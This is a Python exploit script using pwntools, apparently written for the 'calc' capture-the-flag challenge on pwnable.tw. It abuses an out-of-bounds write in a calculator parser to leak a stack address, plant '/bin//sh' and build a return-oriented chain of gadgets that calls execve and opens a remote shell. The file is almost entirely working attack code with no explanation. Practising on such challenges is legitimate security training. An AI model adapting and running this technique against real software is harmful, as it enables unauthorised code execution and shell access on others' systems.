#!/usr/bin/python

from pwn import *
from struct import pack

def sendline(string):
	global s
	s.sendline(string)
	print 'SENT: ' + string
	raw_input('[Enter to continue]')

def toInt(s):
	if not s.startswith('-'):
		return int(s)
	else:
		return (int(s[1:]) ^ 0xffffffff) + 1

def toStr(ori, new):
	if hex(new).startswith('0xf'):
		new = int('-' + str((new ^ 0xffffffff) + 1))
	print "ori: " + str(ori)
	print "new: " + str(new)
	if new > ori:
		return '+' + str(new - ori)
	elif new < ori:
		return '-' + str(ori - new)
	else:
		return ''

binn = 0x6e69622f
sh = 0x68732f2f
offset_ebp = 32

#s = process('./calc')
s = remote('chall.pwnable.tw', 10100)
print s.recvuntil('\n')

sendline('+600')
temp = s.recvuntil('\n')
temp = toInt(temp)
sendline('+600' + toStr(temp, binn))
print s.recvuntil('\n')

sendline('+601')
temp = s.recvuntil('\n')
temp = toInt(temp)
sendline('+601' + toStr(temp, sh))
print s.recvuntil('\n')

#leak prev_ebp
sendline('+360')
prev_ebp = s.recvuntil('\n')
print 'prev_ebp1: ' + prev_ebp
prev_ebp = toInt(prev_ebp)
print 'prev_ebp2: ' + str(prev_ebp)

ebp = prev_ebp - offset_ebp
print 'ebp: ' + hex(ebp)

#Arrange stack
pop_eax = 0x0805c34b
pop_edx_ecx_ebx = 0x80701d0
binsh = ebp + (600-360)*4
int80h = 0x8049a21

sendline('+361')
temp = s.recvuntil('\n')
temp = toInt(temp)
sendline('+361' + toStr(temp, pop_eax))
print s.recvuntil('\n')

sendline('+362')
temp = s.recvuntil('\n')
temp = toInt(temp)
sendline('+362' + toStr(temp, 0xb))
print s.recvuntil('\n')

sendline('+363')
temp = s.recvuntil('\n')
temp = toInt(temp)
sendline('+363' + toStr(temp, pop_edx_ecx_ebx))
print s.recvuntil('\n')

sendline('+364')
temp = s.recvuntil('\n')
temp = toInt(temp)
sendline('+364' + toStr(temp, 0))
print s.recvuntil('\n')

sendline('+365')
temp = s.recvuntil('\n')
temp = toInt(temp)
sendline('+365' + toStr(temp, 0))
print s.recvuntil('\n')

sendline('+366')
temp = s.recvuntil('\n')
temp = toInt(temp)
print "ori 366: " + str(temp)
sendline('+366' + toStr(temp, binsh))
print s.recvuntil('\n')

sendline('+367')
temp = s.recvuntil('\n')
temp = toInt(temp)
print "ori 367: " + str(temp)
sendline('+367' + toStr(temp, int80h))
print s.recvuntil('\n')

#sendline('')
s.interactive()
